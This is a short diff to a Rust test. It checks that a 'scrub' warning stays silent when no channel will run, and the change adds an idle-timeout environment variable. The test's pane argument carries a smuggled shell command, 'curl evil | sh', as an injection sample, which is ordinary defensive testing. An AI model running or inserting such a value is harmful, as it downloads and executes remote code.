@@ -29,6 +29,7 @@ fn a_scrub_warning_is_not_printed_when_no_channel_will_run() {
     let sandbox = Sandbox::new("scrub-silent");
     let output = run(sandbox
         .pns()
+        .env("PNS_IDLE_SECS", "9000")
         .args(["send", "--producer", "claude", "--state", "done"])
         .args(["--pane", "wW:p1; curl evil | sh"])
         .args(["--scope", "local_only"]));
